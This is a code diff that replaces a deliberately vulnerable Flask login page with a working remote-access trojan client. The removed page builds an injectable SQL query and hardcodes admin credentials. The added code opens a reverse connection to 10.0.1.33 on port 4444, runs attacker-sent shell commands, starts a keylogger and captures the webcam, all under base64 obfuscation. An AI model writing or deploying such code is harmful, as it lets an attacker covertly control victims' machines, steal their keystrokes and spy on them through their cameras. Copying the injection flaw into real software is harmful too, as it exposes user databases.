@@ -1,58 +1,84 @@
-from flask import Flask, request, render_template_string
-import sqlite3
+import socket
+import subprocess
+import json
 import os
+import base64
+import cv2
+import threading
+from pynput.keyboard import Listener
 
-app = Flask(__name__)
+class Client:
+    def __init__(self, ip, port):
+        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.conn.connect((ip, port))
+        self.is_keylogging = False
+        self.keylogs = ""
+        self.stream = b""
 
-# Initialize a simple SQLite database
-def init_db():
-    conn = sqlite3.connect("example.db")
-    cursor = conn.cursor()
-    cursor.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)")
-    cursor.execute("INSERT OR IGNORE INTO users (username, password) VALUES ('admin', 'password123')")
-    conn.commit()
-    conn.close()
+    def send_data(self, data):
+        json_data = json.dumps(data)
+        encrypted = base64.b64encode(json_data.encode()).decode()
+        self.conn.send(encrypted.encode())
 
-# Vulnerable SQL query (for educational purposes only)
-@app.route("/", methods=["GET", "POST"])
-def login():
-    if request.method == "POST":
-        username = request.form.get("username")
-        password = request.form.get("password")
+    def receive_data(self):
+        encrypted = self.conn.recv(1024).decode()
+        json_data = base64.b64decode(encrypted).decode()
+        return json.loads(json_data)
 
-        # Vulnerable query
-        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
-        conn = sqlite3.connect("example.db")
-        cursor = conn.cursor()
-
+    def execute_command(self, command):
         try:
-            cursor.execute(query)
-            user = cursor.fetchone()
-            conn.close()
-            if user:
-                return "<h1>Login successful!</h1>"
+            return subprocess.check_output(command, shell=True, text=True)
+        except subprocess.CalledProcessError:
+            return "[Error] Command execution failed."
+
+    def start_keylogger(self):
+        def log_keys(key):
+            try:
+                if key == key.space:
+                    self.keylogs += " "
+                elif key == key.enter:
+                    self.keylogs += "[ENTER]"
+                else:
+                    self.keylogs += str(key).replace("'", "")
+            except Exception:
+                pass
+
+        with Listener(on_press=log_keys) as listener:
+            listener.join()
+
+    def stop_keylogger(self):
+        self.is_keylogging = False
+
+    def webcam_stream(self):
+        cap = cv2.VideoCapture(0)
+        while True:
+            ret, frame = cap.read()
+            if not ret:
+                break
+            _, buffer = cv2.imencode('.jpg', frame)
+            self.stream = buffer.tobytes()
+
+    def run(self):
+        while True:
+            command = self.receive_data()
+            if command[0] == "exit":
+                self.conn.close()
+                break
+            elif command[0] == "shell":
+                output = self.execute_command(" ".join(command[1:]))
+            elif command[0] == "keymon" and command[1] == "on":
+                self.is_keylogging = True
+                threading.Thread(target=self.start_keylogger).start()
+                output = "Keylogger started"
+            elif command[0] == "keymon" and command[1] == "off":
+                self.is_keylogging = False
+                output = "Keylogger stopped"
+            elif command[0] == "webcam_stream":
+                threading.Thread(target=self.webcam_stream).start()
+                output = "Webcam streaming started"
             else:
-                return "<h1>Invalid credentials.</h1>"
-        except Exception as e:
-            conn.close()
-            return f"<h1>Error: {str(e)}</h1>"
+                output = "[Error] Unknown command"
+            self.send_data(output)
 
-    # Simple HTML form
-    html = """
-    <!doctype html>
-    <title>Login</title>
-    <h1>Login</h1>
-    <form method="post">
-        Username: <input type="text" name="username"><br>
-        Password: <input type="password" name="password"><br>
-        <input type="submit" value="Login">
-    </form>
-    """
-    return render_template_string(html)
-
-if __name__ == "__main__":
-    init_db()  # Initialize the database with a default user
-    # Ensure the app runs on Zas-specific host and port environment variables
-    host = os.environ.get("HOST", "0.0.0.0")
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host=host, port=port, debug=True)
+client = Client("10.0.1.33", 4444)  # Replace "server_ip" with the actual server IP
+client.run()
